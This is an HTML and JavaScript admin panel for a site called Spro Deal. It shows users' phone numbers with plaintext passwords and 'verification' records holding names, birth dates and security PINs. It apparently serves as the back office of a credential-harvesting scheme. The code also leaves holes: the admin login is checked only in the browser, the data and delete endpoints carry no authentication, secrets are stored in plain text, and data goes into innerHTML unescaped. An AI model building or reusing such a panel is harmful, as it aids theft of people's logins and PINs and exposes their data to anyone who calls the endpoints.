<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Spro Deal Admin Panel</title>

<style>
body {
    font-family: Arial, sans-serif;
    background: #eef2f3;
    padding: 10px;
}

.container {
    max-width: 900px;
    margin: auto;
    background: white;
    padding: 15px;
    border-radius: 12px;
    box-shadow: 0 4px 20px rgba(0,0,0,0.1);
}

h1, h2 { text-align: center; }

button {
    width: 100%;
    padding: 12px;
    margin-top: 10px;
    background: #4CAF50;
    color: white;
    border: none;
    border-radius: 8px;
    font-size: 16px;
}

button:hover { background: #3e8e41; }

.logout-btn { background: #ff5252; }
.logout-btn:hover { background: #d43b3b; }
.delete-btn { background: #e53935; }
.update-btn { background: #0277bd; }

table {
    width: 100%;
    border-collapse: collapse;
    margin-top: 15px;
    min-width: 700px;
}

th, td {
    border: 1px solid #ccc;
    padding: 10px;
    font-size: 14px;
}
th { background: #4CAF50; color: white; }

#loginBox { padding: 20px; text-align: center; }
input {
    padding: 12px;
    width: 90%;
    border: 1px solid #aaa;
    border-radius: 8px;
    margin-bottom: 10px;
}

#tableAreaWrapper {
    overflow-x: auto;
    margin-top: 15px;
}

#updatePopup {
    position: fixed;
    top: 0; left: 0; width: 100%; height: 100%;
    background: rgba(0,0,0,0.6);
    display: none;
    justify-content: center;
    align-items: center;
}

.popup-box {
    background: white;
    padding: 20px;
    width: 300px;
    border-radius: 10px;
}

@media screen and (max-width: 600px){
    table { font-size: 12px; min-width: 600px; }
    button { font-size: 15px; }
}
</style>
</head>

<body>

<div class="container">

    <!-- ADMIN LOGIN -->
    <div id="loginBox">
        <h2>Admin Login</h2>
        <input type="password" id="adminPass" placeholder="Enter Admin Password">
        <button onclick="adminLogin()">Login</button>
        <p id="loginMsg" style="color:red;"></p>
    </div>

    <!-- PANEL -->
    <div id="adminPanel" style="display:none;">
        <h1>Spro Deal Admin Panel</h1>

        <button onclick="loadUsers()">Show Login Data</button>
        <button onclick="loadVerification()">Show Verification Data</button>
        <button class="logout-btn" onclick="logout()">Logout</button>

        <div id="tableAreaWrapper">
            <div id="tableArea"></div>
        </div>
    </div>

</div>

<!-- UPDATE POPUP -->
<div id="updatePopup">
    <div class="popup-box">
        <h3>Update User</h3>
        <input type="text" id="updPhone" placeholder="Phone">
        <input type="text" id="updPassword" placeholder="Password">
        <button onclick="saveUpdate()">Save</button>
        <button onclick="closePopup()">Cancel</button>
    </div>
</div>

<script>

// ðŸ”¥ APNA BACKEND URL YAHAN LAGAO
const BASE_URL = "https://sprodeal-backend-5.onrender.com";

// ---------------- ADMIN LOGIN ----------------
async function adminLogin() {
    let pass = document.getElementById("adminPass").value;

    const res = await fetch(`${BASE_URL}/admin-login`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ password: pass })
    });

    const data = await res.json();

    if (data.success) {
        document.getElementById("loginBox").style.display = "none";
        document.getElementById("adminPanel").style.display = "block";
    } else {
        alert(data.message);
    }
}

function logout() {
    document.getElementById("adminPanel").style.display = "none";
    document.getElementById("loginBox").style.display = "block";
    document.getElementById("adminPass").value = "";
    document.getElementById("tableArea").innerHTML = "";
}

// ---------------- USERS TABLE ----------------
async function loadUsers() {
    document.getElementById("tableArea").innerHTML = "<h3>Loading...</h3>";

    const res = await fetch(`${BASE_URL}/admin/getUsers`);
    let data = await res.json();

    let html = `
    <h2>Login Data</h2>
    <table>
        <tr>
            <th>ID</th><th>Phone</th><th>Password</th><th>Date</th><th>Action</th>
        </tr>
    `;

    data.forEach(r => {
        html += `
        <tr>
            <td>${r._id}</td>
            <td>${r.phone}</td>
            <td>${r.password}</td>
            <td>${r.createdAt ? new Date(r.createdAt).toLocaleString() : "-"}</td>
            <td>
                <button class="update-btn" onclick="openUpdate('${r._id}', '${r.phone}', '${r.password}')">Update</button>
                <button class="delete-btn" onclick="deleteUser('${r._id}')">Delete</button>
            </td>
        </tr>`;
    });

    html += "</table>";
    document.getElementById("tableArea").innerHTML = html;
}

let updateUserId = null;

function openUpdate(id, phone, pass) {
    updateUserId = id;
    document.getElementById("updPhone").value = phone;
    document.getElementById("updPassword").value = pass;
    document.getElementById("updatePopup").style.display = "flex";
}
function closePopup() {
    document.getElementById("updatePopup").style.display = "none";
}

async function saveUpdate() {
    let phone = document.getElementById("updPhone").value;
    let pass = document.getElementById("updPassword").value;

    await fetch(`${BASE_URL}/admin/updateUser/${updateUserId}`, {
        method: "PUT",
        headers: {"Content-Type":"application/json"},
        body: JSON.stringify({phone, password: pass})
    });

    alert("Updated successfully!");
    closePopup();
    loadUsers();
}

async function deleteUser(id) {
    if (!confirm("Are you sure?")) return;

    await fetch(`${BASE_URL}/admin/deleteUser/${id}`, { method: "DELETE" });

    alert("Deleted!");
    loadUsers();
}

// ---------------- VERIFICATION TABLE ----------------
async function loadVerification() {

    document.getElementById("tableArea").innerHTML = "<h3>Loading...</h3>";

    const res = await fetch(`${BASE_URL}/admin/getVerification`);
    let data = await res.json();

    let html = `
    <h2>Verification Data</h2>
    <table>
        <tr>
            <th>ID</th><th>User ID</th><th>Name</th><th>DOB</th>
            <th>Problem</th><th>PIN</th><th>Experience</th><th>Action</th>
        </tr>
    `;

    data.forEach(r => {
        html += `
        <tr>
            <td>${r._id}</td>
            <td>${r.user_id}</td>
            <td>${r.full_name}</td>
            <td>${r.dob ? new Date(r.dob).toLocaleDateString() : "-"}</td>
            <td>${r.problem}</td>
            <td>${r.security_pin}</td>
            <td>${r.experience}</td>
            <td><button class="delete-btn" onclick="deleteVerification('${r._id}')">Delete</button></td>
        </tr>`;
    });

    html += "</table>";
    document.getElementById("tableArea").innerHTML = html;
}

async function deleteVerification(id) {
    if (!confirm("Are you sure?")) return;

    await fetch(`${BASE_URL}/admin/deleteVerification/${id}`, { method: "DELETE" });

    alert("Deleted!");
    loadVerification();
}

</script>

</body>
</html>
